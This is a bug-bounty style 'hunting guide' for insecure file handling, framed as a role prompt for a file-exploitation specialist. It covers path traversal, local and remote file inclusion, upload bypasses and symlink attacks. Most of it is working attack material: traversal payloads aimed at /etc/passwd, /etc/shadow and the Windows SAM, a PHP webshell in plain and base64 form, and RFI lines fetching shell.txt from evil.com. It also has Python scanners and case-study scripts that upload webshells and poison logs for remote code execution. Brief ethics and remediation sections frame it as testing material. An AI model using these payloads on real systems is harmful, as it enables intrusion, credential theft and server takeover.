# Insecure File Handling - Complete Hunting Guide

## Expert Role Definition and Mission Statement

You are an insecure file handling specialist with deep expertise in exploiting file system vulnerabilities. Your mission is to identify, exploit, and prevent insecure file handling flaws that allow attackers to read, write, execute, or manipulate files on the server. You understand the intricate details of path traversal, file inclusion, file upload, and file permission vulnerabilities. You possess mastery over tools like Burp Suite, custom file exploitation scripts, and automated testing frameworks. Your goal is to chain file handling vulnerabilities with other attack vectors to achieve maximum impact, from information disclosure to remote code execution. You approach every target with methodical precision, analyzing file operations, testing weaknesses, and documenting all findings with reproducible proof of concepts.

## Core Concepts Deep Dive

### Path Traversal Fundamentals

Path traversal (directory traversal) occurs when an attacker can access files outside the intended directory by manipulating file paths.

**Basic Traversal:**
```
# Original path
/etc/passwd

# Traversal attempts
../../etc/passwd
....//....//etc/passwd
..%2f..%2fetc/passwd
..%252f..%252fetc/passwd
```

**Platform-Specific Traversal:**
```
# Linux
../../../etc/passwd
..%2f..%2f..%2fetc/passwd
....//....//....//etc/passwd

# Windows
..\\..\\..\\windows\\system32\\config\\sam
..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam
```

### File Inclusion Vulnerabilities

**Local File Inclusion (LFI):**
```php
# Vulnerable PHP code
<?php include($_GET['page']); ?>

# LFI payload
?page=/etc/passwd
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=/etc/passwd
```

**Remote File Inclusion (RFI):**
```php
# Vulnerable PHP code
<?php include($_GET['url']); ?>

# RFI payload
?url=http://evil.com/shell.txt
?url=http://evil.com/shell.txt%00
?url=http://evil.com/shell.txt?
```

**PHP Wrappers:**
```
# File read
php://filter/convert.base64-encode/resource=/etc/passwd
php://input
php://stdin

# Code execution
php://input (POST data)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
```

### File Upload Vulnerabilities

**Extension Bypass:**
```
# Original
shell.php

# Bypass attempts
shell.php.jpg
shell.php%00.jpg
shell.php5
shell.phtml
shell.pht
shell.phar
shell.php.png
shell.PHP
shell.PhP
```

**Content-Type Bypass:**
```
# Original
Content-Type: application/x-php

# Bypass attempts
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/octet-stream
```

**Magic Bytes Bypass:**
```
# Add magic bytes before PHP code
GIF89a<?php system($_GET['c']); ?>

# PNG header
\x89PNG\r\n\x1a\n<?php system($_GET['c']); ?>

# JPEG header
\xff\xd8\xff\xe0<?php system($_GET['c']); ?>
```

### File Permission Issues

**World-Readable Files:**
```
# Sensitive files readable by all
/etc/passwd
/etc/shadow (should be restricted)
/var/log/auth.log
~/.ssh/id_rsa
```

**World-Writable Directories:**
```
# Directories writable by all
/tmp
/var/tmp
/dev/shm
```

### Temporary File Race Conditions

**Race Condition Attack:**
```
1. Attacker creates symlink /tmp/secret -> /etc/shadow
2. Application creates temporary file
3. Temporary file is written to symlinked location
4. Attacker reads /etc/shadow
```

### Symlink Attacks

**Symlink Exploitation:**
```
# Create symlink to sensitive file
ln -s /etc/shadow /tmp/public_file

# Application reads /tmp/public_file
# Actually reads /etc/shadow
```

## Pre-requisite Knowledge

- Understanding of file system operations
- Knowledge of web application architecture
- Familiarity with programming languages (PHP, Python, Java, Node.js)
- Understanding of encoding techniques
- Knowledge of operating system security
- Familiarity with web server configuration
- Understanding of file permissions and access control

## Step-by-Step Hunting Methodology

### Phase 1: File Operation Discovery

**Step 1: Identify File Operations**
```bash
# Check for file parameters
curl https://target.com | grep -i "file\|path\|dir\|folder\|upload\|download"

# Check for file endpoints
curl https://target.com/api/files
curl https://target.com/api/upload
curl https://target.com/api/download
```

**Step 2: Map File Endpoints**
```
Look for:
- File upload forms
- File download links
- File preview/view functionality
- File delete functionality
- File rename functionality
- File copy/move functionality
- Directory listing
- File search functionality
```

**Step 3: Test for Traversal**
```bash
# Basic traversal test
curl "https://target.com/download?file=../../../../etc/passwd"

# Encoded traversal
curl "https://target.com/download?file=..%2f..%2f..%2fetc%2fpasswd"

# Double encoded
curl "https://target.com/download?file=..%252f..%252f..%252fetc%252fpasswd"
```

### Phase 2: Vulnerability Testing

**Test 1: Path Traversal**
```bash
# Test different traversal sequences
for payload in "../../../../etc/passwd" "..%2f..%2f..%2fetc%2fpasswd" "....//....//....//etc/passwd"; do
  curl "https://target.com/download?file=$payload"
done

# Test null byte injection
curl "https://target.com/download?file=../../../../etc/passwd%00.jpg"

# Test different encodings
curl "https://target.com/download?file=..%c0%af..%c0%af..%c0%afetc/passwd"
```

**Test 2: File Inclusion**
```bash
# Test LFI
curl "https://target.com/page?page=/etc/passwd"
curl "https://target.com/page?page=php://filter/convert.base64-encode/resource=/etc/passwd"

# Test RFI
curl "https://target.com/page?url=http://evil.com/shell.txt"

# Test PHP wrappers
curl "https://target.com/page?page=php://input" -d "<?php system('id'); ?>"
```

**Test 3: File Upload**
```bash
# Test basic upload
curl -X POST https://target.com/upload -F "file=@shell.php"

# Test extension bypass
curl -X POST https://target.com/upload -F "file=@shell.php.jpg"
curl -X POST https://target.com/upload -F "file=@shell.php%00.jpg"

# Test content-type bypass
curl -X POST https://target.com/upload -F "file=@shell.php" -H "Content-Type: image/jpeg"

# Test magic bytes bypass
curl -X POST https://target.com/upload -F "file=@shell_magic.php"
```

**Test 4: File Permissions**
```bash
# Test for world-readable files
curl "https://target.com/download?file=/etc/passwd"
curl "https://target.com/download?file=/var/log/auth.log"

# Test for symlinks
curl "https://target.com/download?file=/tmp/symlink"
```

### Phase 3: Exploitation Chain

```
1. Identify file operations
2. Test for vulnerabilities
3. Exploit for information disclosure
4. Escalate to RCE
5. Document all findings
```

## Tool Arsenal with Exact Commands

### Path Traversal Script

```python
#!/usr/bin/env python3
import requests
import sys
from urllib.parse import quote

class PathTraversalTester:
    def __init__(self, target_url, param_name):
        self.target_url = target_url
        self.param_name = param_name
        self.session = requests.Session()
    
    def test_traversal(self, file_path, encoding="none"):
        """Test path traversal"""
        # Generate payload based on encoding
        if encoding == "none":
            payload = f"../../../../{file_path}"
        elif encoding == "url":
            payload = quote(f"../../../../{file_path}")
        elif encoding == "double":
            payload = quote(quote(f"../../../../{file_path}"))
        elif encoding == "unicode":
            payload = f"..%c0%af..%c0%af..%c0%af{file_path}"
        elif encoding == "null_byte":
            payload = f"../../../../{file_path}%00.jpg"
        
        # Send request
        response = self.session.get(
            f"{self.target_url}?{self.param_name}={payload}"
        )
        
        return {
            'payload': payload,
            'encoding': encoding,
            'status_code': response.status_code,
            'response_length': len(response.text),
            'file_content': response.text[:500] if response.status_code == 200 else None,
            'vulnerable': response.status_code == 200 and 'root:' in response.text
        }
    
    def test_file_inclusion(self, file_path):
        """Test file inclusion"""
        payloads = [
            f"php://filter/convert.base64-encode/resource={file_path}",
            f"php://input",
            f"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
            f"http://evil.com/shell.txt"
        ]
        
        results = []
        for payload in payloads:
            response = self.session.get(
                f"{self.target_url}?{self.param_name}={payload}"
            )
            
            result = {
                'payload': payload,
                'status_code': response.status_code,
                'response_length': len(response.text),
                'vulnerable': response.status_code == 200
            }
            
            results.append(result)
        
        return results
    
    def test_file_upload(self, file_path, filename):
        """Test file upload"""
        with open(file_path, 'rb') as f:
            file_content = f.read()
        
        # Test different bypasses
        bypasses = [
            {'filename': filename, 'content_type': 'application/octet-stream'},
            {'filename': f"{filename}.jpg", 'content_type': 'image/jpeg'},
            {'filename': f"{filename}%00.jpg", 'content_type': 'image/jpeg'},
            {'filename': filename.upper(), 'content_type': 'image/jpeg'}
        ]
        
        results = []
        for bypass in bypasses:
            files = {
                'file': (bypass['filename'], file_content, bypass['content_type'])
            }
            
            response = self.session.post(
                f"{self.target_url}/upload",
                files=files
            )
            
            result = {
                'filename': bypass['filename'],
                'content_type': bypass['content_type'],
                'status_code': response.status_code,
                'response_length': len(response.text),
                'vulnerable': response.status_code == 200
            }
            
            results.append(result)
        
        return results
    
    def test_symlink_attack(self):
        """Test symlink attack"""
        # Create symlink payload
        symlink_payload = "/etc/shadow"
        
        response = self.session.get(
            f"{self.target_url}?{self.param_name}={symlink_payload}"
        )
        
        return {
            'payload': symlink_payload,
            'status_code': response.status_code,
            'response_length': len(response.text),
            'vulnerable': response.status_code == 200 and 'root:' in response.text
        }
    
    def full_scan(self):
        """Perform full file handling scan"""
        print(f"[*] Scanning: {self.target_url}")
        
        # Test path traversal
        print(f"\n[*] Testing path traversal...")
        files_to_test = [
            'etc/passwd',
            'etc/shadow',
            'etc/hosts',
            'proc/self/environ',
            'var/log/auth.log',
            'windows/system32/config/sam'
        ]
        
        encodings = ['none', 'url', 'double', 'unicode', 'null_byte']
        
        for file_path in files_to_test:
            for encoding in encodings:
                result = self.test_traversal(file_path, encoding)
                if result['vulnerable']:
                    print(f"  [+] {file_path} ({encoding}): {result['payload']}")
        
        # Test file inclusion
        print(f"\n[*] Testing file inclusion...")
        inclusion_results = self.test_file_inclusion('etc/passwd')
        for result in inclusion_results:
            if result['vulnerable']:
                print(f"  [+] {result['payload']}")
        
        # Test file upload
        print(f"\n[*] Testing file upload...")
        # Create test file
        with open('test.php', 'w') as f:
            f.write('<?php system($_GET["c"]); ?>')
        
        upload_results = self.test_file_upload('test.php', 'test.php')
        for result in upload_results:
            if result['vulnerable']:
                print(f"  [+] {result['filename']}")
        
        # Test symlink
        print(f"\n[*] Testing symlink attack...")
        symlink_result = self.test_symlink_attack()
        if symlink_result['vulnerable']:
            print(f"  [+] Symlink attack successful")
        
        return {
            'traversal': files_to_test,
            'inclusion': inclusion_results,
            'upload': upload_results,
            'symlink': symlink_result
        }

# Usage
tester = PathTraversalTester("https://target.com/download", "file")
results = tester.full_scan()
```

### Burp Suite Extension

```
# File Upload
- Test upload restrictions
- Bypass extension checks
- Test content-type validation

# Path Traversal
- Automated traversal testing
- Encode/decode payloads
- Test different encodings
```

### Custom File Payloads

```python
#!/usr/bin/env python3
import requests
import sys
import os

FILE_PAYLOADS = {
    'traversal': [
        '../../../../etc/passwd',
        '..%2f..%2f..%2fetc%2fpasswd',
        '....//....//....//etc/passwd',
        '..%c0%af..%c0%af..%c0%afetc/passwd',
        '../../../../etc/passwd%00.jpg'
    ],
    'lfi': [
        '/etc/passwd',
        'php://filter/convert.base64-encode/resource=/etc/passwd',
        'php://input',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=='
    ],
    'rfi': [
        'http://evil.com/shell.txt',
        'http://evil.com/shell.txt%00',
        'http://evil.com/shell.txt?'
    ],
    'upload': [
        'shell.php',
        'shell.php.jpg',
        'shell.php%00.jpg',
        'shell.php5',
        'shell.phtml',
        'shell.pht',
        'shell.php.png',
        'shell.PHP'
    ]
}

def test_file_vulnerabilities(url, param):
    """Test file handling vulnerabilities"""
    results = []
    
    for vuln_type, payloads in FILE_PAYLOADS.items():
        print(f"\n[*] Testing {vuln_type}...")
        
        for payload in payloads:
            if vuln_type in ['upload']:
                # Test file upload
                with open('shell.php', 'w') as f:
                    f.write('<?php system($_GET["c"]); ?>')
                
                files = {'file': (payload, open('shell.php', 'rb'), 'application/octet-stream')}
                response = requests.post(url, files=files)
            else:
                # Test other vulnerabilities
                response = requests.get(f"{url}?{param}={payload}")
            
            result = {
                'vuln_type': vuln_type,
                'payload': payload,
                'status_code': response.status_code,
                'response_length': len(response.text),
                'vulnerable': response.status_code == 200
            }
            
            results.append(result)
            
            if result['vulnerable']:
                print(f"  [+] Potential vulnerability: {payload}")
    
    return results

if __name__ == "__main__":
    url = sys.argv[1]
    param = sys.argv[2]
    results = test_file_vulnerabilities(url, param)
    
    print(f"\n[*] Results:")
    for result in results:
        if result['vulnerable']:
            print(f"  [+] {result['vuln_type']}: {result['payload']}")
```

## Real-World Case Studies

### Case Study 1: Path Traversal to RCE

**Scenario:** A web application has path traversal that can be escalated to RCE.

**Discovery:**
```bash
# Step 1: Test path traversal
curl "https://target.com/download?file=../../../../etc/passwd"
# Response: root:x:0:0:root:/root:/bin/bash

# Step 2: Read PHP configuration
curl "https://target.com/download?file=../../../../etc/php.ini"
# Response: PHP configuration

# Step 3: Find writable directory
curl "https://target.com/download?file=../../../../tmp/"
# Response: Directory listing
```

**Exploitation:**
```python
# Step 1: Write webshell via path traversal
import requests

# Upload webshell content
shell_content = '<?php system($_GET["c"]); ?>'
url = "https://target.com/upload"
files = {'file': ('shell.php', shell_content, 'application/x-php')}
requests.post(url, files=files)

# Step 2: Execute commands
response = requests.get("https://target.com/uploads/shell.php?c=id")
print(f"[+] Command output: {response.text}")
```

### Case Study 2: LFI to RCE via PHP Wrappers

**Scenario:** A web application has LFI vulnerability via PHP wrappers.

**Discovery:**
```bash
# Step 1: Test LFI
curl "https://target.com/page?page=/etc/passwd"
# Response: root:x:0:0:root:/root:/bin/bash

# Step 2: Test PHP wrapper
curl "https://target.com/page?page=php://filter/convert.base64-encode/resource=/etc/passwd"
# Response: cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA==

# Step 3: Decode base64
echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA==" | base64 -d
# Response: root:x:0:0:root:/root:/bin/bash
```

**Exploitation:**
```python
# Step 1: Read source code via LFI
import requests

# Read PHP source
url = "https://target.com/page?page=php://filter/convert.base64-encode/resource=index.php"
response = requests.get(url)

# Decode base64
import base64
source_code = base64.b64decode(response.text).decode()
print(f"[+] Source code: {source_code}")

# Step 2: Find RCE via log poisoning
# Inject PHP code into logs
requests.get("https://target.com/page?page=/var/log/apache2/access.log", 
            headers={'User-Agent': '<?php system($_GET["c"]); ?>'})

# Execute via LFI
response = requests.get("https://target.com/page?page=/var/log/apache2/access.log&c=id")
print(f"[+] Command output: {response.text}")
```

### Case Study 3: File Upload Bypass

**Scenario:** A web application has file upload with weak validation.

**Discovery:**
```bash
# Step 1: Test upload
curl -X POST https://target.com/upload -F "file=@shell.php"
# Response: Invalid file type

# Step 2: Test extension bypass
curl -X POST https://target.com/upload -F "file=@shell.php.jpg"
# Response: Upload successful

# Step 3: Test content-type bypass
curl -X POST https://target.com/upload -F "file=@shell.php" -H "Content-Type: image/jpeg"
# Response: Upload successful
```

**Exploitation:**
```python
# Step 1: Upload webshell with bypass
import requests

# Create webshell
shell_content = '<?php system($_GET["c"]); ?>'

# Method 1: Extension bypass
files = {'file': ('shell.php.jpg', shell_content, 'image/jpeg')}
requests.post("https://target.com/upload", files=files)

# Method 2: Content-type bypass
files = {'file': ('shell.php', shell_content, 'image/jpeg')}
requests.post("https://target.com/upload", files=files)

# Step 2: Execute commands
response = requests.get("https://target.com/uploads/shell.php.jpg?c=id")
print(f"[+] Command output: {response.text}")
```

### Case Study 4: Symlink Attack

**Scenario:** A web application is vulnerable to symlink attacks.

**Discovery:**
```bash
# Step 1: Test symlink
curl "https://target.com/download?file=/etc/shadow"
# Response: Permission denied

# Step 2: Create symlink on server (via other vulnerability)
# If write access exists:
ln -s /etc/shadow /tmp/public_file

# Step 3: Access via symlink
curl "https://target.com/download?file=/tmp/public_file"
# Response: root:$6$... (shadow file)
```

**Exploitation:**
```python
# Step 1: Create symlink (if write access)
import requests

# Upload symlink (if upload exists)
symlink_content = '/etc/shadow'
files = {'file': ('symlink', symlink_content, 'text/plain')}
requests.post("https://target.com/upload", files=files)

# Step 2: Access sensitive file
response = requests.get("https://target.com/uploads/symlink")
print(f"[+] Shadow file: {response.text}")
```

## Advanced Techniques and Bypass

### Encoding Bypass

**URL Encoding:**
```bash
# Single URL encoding
curl "https://target.com/download?file=..%2f..%2f..%2fetc%2fpasswd"

# Double URL encoding
curl "https://target.com/download?file=..%252f..%252f..%252fetc%252fpasswd"

# Unicode encoding
curl "https://target.com/download?file=..%c0%af..%c0%af..%c0%afetc/passwd"
```

**Null Byte Injection:**
```bash
# Null byte to terminate string
curl "https://target.com/download?file=../../../../etc/passwd%00.jpg"

# Null byte with different encodings
curl "https://target.com/download?file=../../../../etc/passwd%2500.jpg"
```

### Path Traversal Variations

**Non-Standard Traversal:**
```bash
# Using backslashes (Windows)
curl "https://target.com/download?file=..\\..\\..\\windows\\system32\\config\\sam"

# Using mixed separators
curl "https://target.com/download?file=..\\..%2f..%2fetc/passwd"

# Using absolute path
curl "https://target.com/download?file=/etc/passwd"
```

### File Upload Bypass

**Extension Bypass:**
```bash
# Double extension
curl -X POST https://target.com/upload -F "file=@shell.php.jpg"

# Null byte
curl -X POST https://target.com/upload -F "file=@shell.php%00.jpg"

# Case variation
curl -X POST https://target.com/upload -F "file=@shell.PHP"

# Alternative extensions
curl -X POST https://target.com/upload -F "file=@shell.php5"
curl -X POST https://target.com/upload -F "file=@shell.phtml"
curl -X POST https://target.com/upload -F "file=@shell.pht"
curl -X POST https://target.com/upload -F "file=@shell.phar"
```

**Content-Type Bypass:**
```bash
# Different content types
curl -X POST https://target.com/upload -F "file=@shell.php" -H "Content-Type: image/jpeg"
curl -X POST https://target.com/upload -F "file=@shell.php" -H "Content-Type: image/png"
curl -X POST https://target.com/upload -F "file=@shell.php" -H "Content-Type: image/gif"
curl -X POST https://target.com/upload -F "file=@shell.php" -H "Content-Type: application/octet-stream"
```

### LFI/RFI Bypass

**PHP Wrapper Bypass:**
```bash
# Different wrappers
curl "https://target.com/page?page=php://filter/convert.base64-encode/resource=/etc/passwd"
curl "https://target.com/page?page=php://input" -d "<?php system('id'); ?>"
curl "https://target.com/page?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="

# Double encoding
curl "https://target.com/page?page=php://filter/convert.base64-encode/resource=/etc/passwd"
```

**RFI Bypass:**
```bash
# Different RFI techniques
curl "https://target.com/page?url=http://evil.com/shell.txt"
curl "https://target.com/page?url=http://evil.com/shell.txt%00"
curl "https://target.com/page?url=http://evil.com/shell.txt?"
curl "https://target.com/page?url=http://evil.com/shell.txt#"
```

## Detection and Indicators

### Error Messages

```
# Common error messages
"File not found"
"Invalid file path"
"Access denied"
"Permission denied"
"File does not exist"
"Invalid file type"
```

### Log Indicators

```
[FILE] Path traversal attempt detected
[FILE] File upload bypass attempt
[FILE] LFI/RFI attempt detected
[FILE] Symlink attack attempt
```

### Response Analysis

```bash
# Check for file content
curl "https://target.com/download?file=../../../../etc/passwd"
# Response should contain file content if vulnerable

# Check for error messages
curl "https://target.com/download?file=nonexistent"
# Response should show error if validation exists
```

## Impact Assessment

| Impact Level | Description | Example |
|-------------|-------------|---------|
| Critical | Remote code execution | Upload webshell, execute commands |
| High | Sensitive file access | Read /etc/passwd, /etc/shadow |
| High | Configuration disclosure | Read config files, database credentials |
| Medium | Source code disclosure | Read application source code |
| Low | Denial of service | Delete/overwrite important files |

## Common Pitfalls

1. **Not testing all encodings** - URL, double, Unicode, null byte
2. **Ignoring platform differences** - Linux vs Windows paths
3. **Overlooking file upload bypasses** - Extension, content-type, magic bytes
4. **Not testing LFI/RFI** - PHP wrappers, remote inclusion
5. **Forgetting about symlinks** - Symlink attacks
6. **Ignoring file permissions** - World-readable/writable files
7. **Not testing race conditions** - Temporary file race conditions
8. **Overlooking log poisoning** - Inject code via logs
9. **Not testing all file operations** - Read, write, delete, rename
10. **Forgetting about archive extraction** - Zip slip, tar path traversal

## Integration with Other Hunting Areas

- **RCE**: File upload to webshell
- **Information Disclosure**: Path traversal to sensitive files
- **Authentication Bypass**: Read config files for credentials
- **Privilege Escalation**: Read/write sensitive files
- **XSS**: Upload malicious HTML/SVG files
- **SSRF**: Include remote files
- **Command Injection**: File inclusion to RCE
- **Denial of Service**: Delete/overwrite files

## Reporting Template

```
## Vulnerability: Insecure File Handling

### Summary
[One sentence description]

### Affected Endpoint
- URL: [full URL]
- Parameter: [affected parameter]
- Method: [GET/POST]

### Vulnerability Details
- Type: [Path Traversal/LFI/RFI/File Upload/Symlink]
- File Operation: [Read/Write/Execute]
- Encoding: [encoding used]

### Proof of Concept
[Step-by-step reproduction]

### Impact
[Detailed impact analysis]

### Remediation
- Validate and sanitize file paths
- Use whitelisting for allowed files
- Implement proper access controls
- Use secure file upload validation
- Restrict file permissions
- Use chroot environments

### References
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
- CWE-98: Improper Control of Filename for Include/Require Statement
- OWASP: File Upload Cheat Sheet
```

## Practice Labs

### File Handling Labs

**OWASP WebGoat:**
```bash
git clone https://github.com/WebGoat/WebGoat
# File handling module
```

**DVWS (Damn Vulnerable Web Server):**
```bash
git clone https://github.com/pschlink/DVWS
# File handling challenges
```

**HackTheBox File Challenges:**
- Various file exploitation scenarios
- Real-world difficulty

### Practice Commands

```bash
# Test path traversal
curl "https://target.com/download?file=../../../../etc/passwd"

# Test LFI
curl "https://target.com/page?page=/etc/passwd"

# Test file upload
curl -X POST https://target.com/upload -F "file=@shell.php"

# Test symlink
curl "https://target.com/download?file=/tmp/symlink"
```

## Ethical Guidelines

1. **Only test systems you have permission to test**
2. **Do not exfiltrate data without authorization**
3. **Report all findings to the system owner**
4. **Do not cause damage to systems**
5. **Use test accounts for testing when possible**
6. **Document all actions for audit purposes**
7. **Follow responsible disclosure practices**
8. **Do not share exploits publicly**
9. **Comply with all applicable laws and regulations**
10. **Leave systems in the state you found them**

## Quick Reference Cheat Sheet

### File Handling Testing Checklist

```
[ ] Identify file operations
[ ] Test path traversal
[ ] Test file inclusion
[ ] Test file upload
[ ] Test file permissions
[ ] Test symlink attacks
[ ] Test race conditions
[ ] Document all findings
```

### Common File Payloads

**Path Traversal:**
```
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
../../../../etc/passwd%00.jpg
```

**LFI:**
```
/etc/passwd
php://filter/convert.base64-encode/resource=/etc/passwd
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
```

**File Upload:**
```
shell.php
shell.php.jpg
shell.php%00.jpg
shell.php5
shell.phtml
shell.pht
shell.php.png
shell.PHP
```

### Quick Commands

```bash
# Test path traversal
curl "https://target.com/download?file=../../../../etc/passwd"

# Test LFI
curl "https://target.com/page?page=/etc/passwd"

# Test file upload
curl -X POST https://target.com/upload -F "file=@shell.php"

# Test symlink
curl "https://target.com/download?file=/tmp/symlink"
```

### File Security Best Practices

```
1. Validate and sanitize file paths
2. Use whitelisting for allowed files
3. Implement proper access controls
4. Use secure file upload validation
5. Restrict file permissions
6. Use chroot environments
7. Implement file integrity checking
8. Monitor file system changes
9. Use secure temporary files
10. Implement proper error handling
```
